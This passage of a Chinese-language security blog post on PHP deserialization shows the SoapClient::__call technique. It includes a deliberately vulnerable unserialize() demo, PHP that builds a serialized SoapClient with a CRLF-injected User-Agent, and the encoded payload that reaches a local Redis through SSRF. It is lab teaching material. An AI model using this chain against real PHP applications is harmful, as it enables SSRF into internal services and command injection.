class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="SoapClient-call"><a href="#SoapClient-call" class="headerlink" title="SoapClient::__call"></a>SoapClient::__call</h3><ul>
<li>SOAP就是一个简单的构造<code>http</code>或<code>https</code>请求，就像类似于<code>Python</code>的<code>request</code>吧。只不过这里是将<code>XML</code>作为数据传输的格式。</li>
<li><code>SoapClient (mixed $wsdl [,array $options ])</code>这里有两个参数，第一个是wsdl模式下的<code>uri</code>选择，若该值为<code>NULL</code>，那么则不用<code>wsdl</code>模式，则后面的数组需要设置<code>localtion</code>和<code>uri</code>参数。<code>location</code>则是发送请求的<code>URL</code>,<code>uri</code>则是类似于统一资源定位符，就是你需要请求的资源文件名。</li>
<li>这个类中又提供了魔术方法<code>__call()</code>，当调用一个不存在或不可访问的方法时触发。通过构造的<code>HTTP</code>请求则可以造成<code>SSRF</code>.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&#x27;info.php&#x27;</span>;</span><br><span class="line"><span class="variable">$location</span> = <span class="string">&#x27;http://127.0.0.1:5555/&#x27;</span>;</span><br><span class="line"><span class="variable">$soap</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(location=&gt;<span class="variable">$location</span>,uri=&gt;<span class="variable">$uri</span>));</span><br><span class="line"><span class="variable">$SerSoap</span> = serialize(<span class="variable">$soap</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$SerSoap</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$UnserSoap</span> = unserialize(<span class="variable">$SerSoap</span>);</span><br><span class="line"><span class="variable">$UnserSoap</span>-&gt;Panda();   <span class="comment">// 该函数不存在</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/soap.png" alt="soap"></p>
<ul>
<li>这里是<code>POST</code>请求的，如果我们需要构造<code>GET</code>请求，只需使用<code>wsdl</code>模式即可，实例化内容即为攻击目标地址如<code>http://127.0.0.1/info.php</code>.</li>
<li>这里似乎没啥，但是发现<code>User-Agent</code>我们可控再结合<code>HTTP</code>的<code>CRLF</code>漏洞，那么问题就出来了。</li>
</ul>
<h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><ul>
<li>我是<code>Windows</code>我就开一个<code>Redis</code>服务，但是把他限制<code>IP</code>连接为本地。</li>
</ul>
<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/SetRedis.png" alt="SetRedis"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$undata</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line">print_r(<span class="variable">$undata</span>);</span><br><span class="line"><span class="variable">$undata</span>-&gt;Panda();</span><br></pre></td></tr></table></figure>

<ul>
<li>看代码只有反序列化点，但是没看到利用类，那么就用<code>SoapClient</code>中的<code>__call()</code>方法来进行<code>SSRF</code>。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$localtion</span> = <span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;Panda\r\nSET NAME Panda&quot;</span>;</span><br><span class="line"><span class="variable">$soap</span> = <span class="keyword">new</span> SoapClient(<span class="literal">NULL</span>,<span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$localtion</span>,</span><br><span class="line">   <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$payload</span>,</span><br><span class="line">));</span><br><span class="line"><span class="variable">$SerSoap</span> = serialize(<span class="variable">$soap</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$SerSoap</span>);</span><br><span class="line"><span class="comment">// O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22test%22%3Bs%3A8%3A%22location%22%3Bs%3A22%3A%22http%3A%2F%2F127.0.0.1%3A6379%2F%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A21%3A%22Panda%0D%0ASET+NAME+Panda%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure>

<ul>
<li>再进行<code>POST</code>提交payload后，再去<code>Redis</code>中看，已经出现了我们的<code>Payload</code></li>
</ul>
<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/SoapRedis.png" alt="SoapRedis"></p>
<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/RedisPanda.png" alt="Redis"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://www.github.com/Pan3a">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-amp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">序列化&amp;反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">PHP魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-Wakeup"><span class="toc-number">2.1.</span> <span class="toc-text">Bypass __Wakeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">PHP链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz"><span class="toc-number">3.1.</span> <span class="toc-text">网鼎杯2020青龙组AreUSerialz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF-2020-Ezpop"><span class="toc-number">3.2.</span> <span class="toc-text">MRCTF 2020 Ezpop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">4.</span> <span class="toc-text">PHP反序列化字符串逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E7%94%A8%E5%93%88%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%90%8D%E8%A8%80"><span class="toc-number">5.</span> <span class="toc-text">借用哈大佬们名言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0CTF-2016piapiapia"><span class="toc-number">5.1.</span> <span class="toc-text">0CTF 2016piapiapia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%AF%A2%E6%9D%AF2019-easy-serialize-php"><span class="toc-number">5.2.</span> <span class="toc-text">安询杯2019-easy_serialize_php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">Session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E6%9E%90Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.1.</span> <span class="toc-text">浅析Session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-com"><span class="toc-number">6.2.</span> <span class="toc-text">jarvisoj.com</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E6%9E%90Phar"><span class="toc-number">7.1.</span> <span class="toc-text">浅析Phar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo"><span class="toc-number">7.2.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NCTF2019-phar-matches-everything"><span class="toc-number">7.3.</span> <span class="toc-text">NCTF2019 phar matches everything</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">7.3.1.</span> <span class="toc-text">POC  文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-PHP-FPM"><span class="toc-number">7.3.2.</span> <span class="toc-text">SSRF PHP-FPM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">8.</span> <span class="toc-text">PHP 原生类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient-call"><span class="toc-number">8.1.</span> <span class="toc-text">SoapClient::__call</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Demo-1"><span class="toc-number">8.1.1.</span> <span class="toc-text">Demo</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=PHP-反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=PHP-反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PHP-反序列化&body=Check out this article: http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=PHP-反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=PHP-反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2021
    Pan3a
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://www.github.com/Pan3a">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
